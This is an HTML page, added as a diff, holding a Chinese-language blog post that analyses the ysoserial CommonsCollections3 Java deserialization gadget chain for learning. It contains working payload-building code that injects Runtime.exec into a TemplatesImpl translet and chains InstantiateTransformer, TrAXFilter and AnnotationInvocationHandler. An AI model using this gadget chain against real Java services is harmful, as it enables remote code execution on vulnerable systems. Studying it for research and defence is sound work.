@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前一段时间一直在思考如何学习与发掘java反序列化漏洞，最近有一点小的成果，因此便想借着研究java反序列化利用工具ysoserial的机会来验证下自己的思路。">
+<meta name="keywords" content="Java反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化学习-CommonsCollections3">
+<meta property="og:url" content="http://yoursite.com/2019/10/04/Java反序列化学习-CommonsCollections3/index.html">
+<meta property="og:site_name" content="红猪的笔记">
+<meta property="og:description" content="前一段时间一直在思考如何学习与发掘java反序列化漏洞，最近有一点小的成果，因此便想借着研究java反序列化利用工具ysoserial的机会来验证下自己的思路。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-10-04T15:55:02.493Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java反序列化学习-CommonsCollections3">
+<meta name="twitter:description" content="前一段时间一直在思考如何学习与发掘java反序列化漏洞，最近有一点小的成果，因此便想借着研究java反序列化利用工具ysoserial的机会来验证下自己的思路。">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/04/Java反序列化学习-CommonsCollections3/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Java反序列化学习-CommonsCollections3 | 红猪的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">红猪的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">I am always on the way</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/04/Java反序列化学习-CommonsCollections3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="红猪">
+      <meta itemprop="description" content="我活在世上，无非想要明白些道理，遇见些有趣的事。倘能如我所愿，我的一生就算成功。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="红猪的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java反序列化学习-CommonsCollections3
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-04 23:35:49 / 修改时间：23:55:02" itemprop="dateCreated datePublished" datetime="2019-10-04T23:35:49+08:00">2019-10-04</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞学习/" itemprop="url" rel="index"><span itemprop="name">漏洞学习</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前一段时间一直在思考如何学习与发掘java反序列化漏洞，最近有一点小的成果，因此便想借着研究java反序列化利用工具ysoserial的机会来验证下自己的思路。</p>
+<a id="more"></a>
+<h3 id="Java反序列化利用"><a href="#Java反序列化利用" class="headerlink" title="Java反序列化利用"></a>Java反序列化利用</h3><p>要想掌握Java反序列化漏洞payload的构造，那就要知道在构造Java反序列化的payload的构造过程中有三个比较特别重要的步骤，在这里简称为两点一链：</p>
+<h4 id="输入数据执行点"><a href="#输入数据执行点" class="headerlink" title="输入数据执行点"></a>输入数据执行点</h4><p>输入数据执行点是指能够将攻击者控制的数据作为java代码执行的位置。</p>
+<h4 id="反序列化传导链"><a href="#反序列化传导链" class="headerlink" title="反序列化传导链"></a>反序列化传导链</h4><p>反序列化传导链主要用作链接反序列化利用点和用户数据可控点，能够使用户可控的数据在反序列化过程中被利用。</p>
+<h4 id="反序列化利用点"><a href="#反序列化利用点" class="headerlink" title="反序列化利用点"></a>反序列化利用点</h4><p>反序列化是指在程序的执行流程中有执行反序列化的操作。该位置一般为程序自身实现，只需定位即可。</p>
+<h3 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h3><p>通过前面的学习，现在已经有两个输入数据的执行点和两条反序列化传导链。现在如果只要找到一个新的传导链或者一个新的数据执行点即可构造出一个新的发序列化Payload。CommonsCollections就是在前面的基础上找到了一条新的传导链，下面对其进行分析。</p>
+<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Java Collections Framework 是JDK 1.2中的一个重要组成部分。它增加了许多强大的数据结构，加速了最重要的Java应用程序的开发。从那时起，它已经成为Java中集合处理的公认标准。官网介绍如下:Commons Collections使用场景很广，很多商业,开源项目都使用到了commons-collections.jar。 很多组件，容器，cms(诸如WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等)的rce漏洞都和Commons Collections反序列被披露事件有关。</p>
+<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><em>整个分析过程并未完全按照ysoserial中的代码进行分析，而是结合前面的思考结果进行分段分析，但是整个payload的生成流程与ysoserial中一致。</em></p>
+<h5 id="输入数据执行点-1"><a href="#输入数据执行点-1" class="headerlink" title="输入数据执行点"></a>输入数据执行点</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">classPool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">CtClass ctClass = classPool.get(StubTransletPayload.class.getName());</span><br><span class="line">String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;</span><br><span class="line">ctClass.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">CtClass classSuper = classPool.get(AbstractTranslet.class.getName());</span><br><span class="line">ctClass.setSuperclass(classSuper);</span><br><span class="line"></span><br><span class="line">Class templateClass =TemplatesImpl.class;</span><br><span class="line">Field bytecodesField = templateClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">Permit.setAccessible(bytecodesField);</span><br><span class="line">Field nameField = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">Permit.setAccessible(nameField);</span><br><span class="line">Field factoryField = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">Permit.setAccessible(factoryField);</span><br><span class="line"></span><br><span class="line">byte[] tempBytes = new byte[1024];</span><br><span class="line">Class fooClass = Foo.class;</span><br><span class="line">Class parentClass = fooClass.getEnclosingClass();</span><br><span class="line">String fullName = parentClass.getName().replace(&quot;.&quot;,&quot;/&quot;)+&quot;$&quot;+fooClass.getSimpleName()+&quot;.class&quot;;</span><br><span class="line"></span><br><span class="line">InputStream tempFileInputStream = CommonsCollections3.class.getClassLoader().getResourceAsStream(fullName);</span><br><span class="line">ByteArrayOutputStream out = new ByteArrayOutputStream();</span><br><span class="line">int len =0;</span><br><span class="line">while((len = tempFileInputStream.read(tempBytes))!= -1) &#123;</span><br><span class="line">    out.write(tempBytes, 0, len);</span><br><span class="line">&#125;</span><br><span class="line">// 创建TemplatesImpl实例</span><br><span class="line">TemplatesImpl templatesImpl = (TemplatesImpl) templateClass.newInstance();</span><br><span class="line">bytecodesField.set(templatesImpl,new byte[][]&#123;ctClass.toBytecode(),out.toByteArray()&#125;);</span><br><span class="line">nameField.set(templatesImpl,&quot;Pwner&quot;);</span><br><span class="line">factoryField.set(templatesImpl, new TransformerFactoryImpl());</span><br><span class="line">return templatesImpl;</span><br></pre></td></tr></table></figure>
+<p>可以看到，在该payload中，可控数据执行点就是直接使用了TemplatesImpl，关于其具体的原理，查看CommonsCollections2的讲解，这里不在深入讲解。</p>
+<h5 id="反序列化传导链-1"><a href="#反序列化传导链-1" class="headerlink" title="反序列化传导链"></a>反序列化传导链</h5><p>在CommonsCollections2的payload构造当中，主要是使用了InvokerTransformer来进入可控数据的执行链条，在CommonsCollections3中不再使用InvokerTransformer，而是使用TrAXFilter类来实现这一功能，下面来看一下其传导链的构造方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">    new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">    new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templatesInstance&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">// CommonsCollections1中的传导链</span><br><span class="line">HashMap innerMap = new HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line">Constructor constructors = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];</span><br><span class="line">Permit.setAccessible(constructors);</span><br><span class="line">InvocationHandler invocationHandler = (InvocationHandler) constructors.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(CommonsCollections3.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">InvocationHandler finalInvocationHandler = (InvocationHandler) constructors.newInstance(Override.class,proxyMap);</span><br><span class="line"></span><br><span class="line">FileOutputStream fileOutputStream = new FileOutputStream(new File(&quot;finalInvocationHandler.ser&quot;));</span><br><span class="line">ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line">objectOutputStream.writeObject(finalInvocationHandler);</span><br><span class="line"></span><br><span class="line">FileInputStream fileInputStream = new FileInputStream(new File(&quot;finalInvocationHandler.ser&quot;));</span><br><span class="line">ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure></p>
+<p>从上面的代码可以看到，CommonsCollections3不仅用到了CommonsCollections2中的一部分传导链，也用到了CommonsCollection1中的一部分传导链。CommonsCollections3结合两种传导链，并在其中增加了新的胶合元素TrAXFilter.class,关于AnnotationInvocationHandler与Transformer的传导这里就不分析了，可以参考CommonsCollections1的分析，下面就着重分析下新增的TrAXFilter和InstantiateTransformer这两个类。<br>TrAXFilter.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws TransformerConfigurationException &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">        _overrideD</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从TrAXFilter的源代码中可以看到，TrAXFilter的构造函数调用了TemplatesImpl的newTransformer()方法,因此只要将TemplatesImpl实例传入到TrAXFilter的构造函数中即可。根据Payload构造源码可知，此时使用了ChainedTransformer、ConstantTransformer和InstantiateTransformer来构造TrAXFilter的实例化过程，其中ChainedTransformer和ConstantTranformer前面已经碰到过，下面看一下InstantiateTranformer这个类。<br>InstantiateTransformer.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        super();</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (input instanceof Class == false) &#123;</span><br><span class="line">                throw new FunctorException(</span><br><span class="line">                    &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br><span class="line">                        + (input == null ? &quot;null object&quot; : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br><span class="line">            Constructor con = ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">            return con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);</span><br><span class="line">        &#125; catch (InstantiationException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex);</span><br><span class="line">        &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex);</span><br><span class="line">        &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>分析上面的源代码可知，只要在创建InstantiateTransformer实例时，传入正确的参数类型和参数，然后再调用实例的tranform方法并传入需要实例化的class即可产生需要的对象实例。正好满足前面TrAXFilter类的构造。<br>这样便可以利用InstantiateTransformer 来实例化TrAXFilter，然后再实例化TemplatesImpl，最后使输入的代码能够执行。</p>
+<h5 id="反序列函数调用链"><a href="#反序列函数调用链" class="headerlink" title="反序列函数调用链"></a>反序列函数调用链</h5><p>根据上面的分析来还原下整个反序列化过程的调用链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject</span><br><span class="line">    Map.entrySet</span><br><span class="line">        AnnotationInvocationHandler.invoke</span><br><span class="line">            Map.get</span><br><span class="line">                ChainedTransformer.transform</span><br><span class="line">                    ConstantTransformer.transform</span><br><span class="line">                        InstantiateTransformer.transform</span><br><span class="line">                            TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer</span><br><span class="line">                                    TemplatesImpl.getTransletInstance</span><br><span class="line">                                        TemplatesImpl.defineTransletClasses</span><br></pre></td></tr></table></figure></p>
+<h5 id="源代码文件"><a href="#源代码文件" class="headerlink" title="源代码文件"></a>源代码文件</h5><p>1.<a href="https://github.com/0x4472/ysoserialResearch" target="_blank" rel="noopener">源代码工程文件</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Java反序列化/" rel="tag"># Java反序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/03/Java反序列化学习-CommonsCollections2/" rel="next" title="Java反序列化学习-CommonsCollections2">
+                <i class="fa fa-chevron-left"></i> Java反序列化学习-CommonsCollections2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">红猪</p>
+              <p class="site-description motion-element" itemprop="description">我活在世上，无非想要明白些道理，遇见些有趣的事。倘能如我所愿，我的一生就算成功。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/0x4472" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:0x4472@protonmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Java反序列化利用"><span class="nav-number">1.</span> <span class="nav-text">Java反序列化利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#输入数据执行点"><span class="nav-number">1.1.</span> <span class="nav-text">输入数据执行点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化传导链"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化传导链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化利用点"><span class="nav-number">1.3.</span> <span class="nav-text">反序列化利用点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections3"><span class="nav-number">2.</span> <span class="nav-text">CommonsCollections3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#介绍"><span class="nav-number">2.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码分析"><span class="nav-number">2.2.</span> <span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#输入数据执行点-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">输入数据执行点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化传导链-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">反序列化传导链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列函数调用链"><span class="nav-number">2.2.3.</span> <span class="nav-text">反序列函数调用链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#源代码文件"><span class="nav-number">2.2.4.</span> <span class="nav-text">源代码文件</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">红猪</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
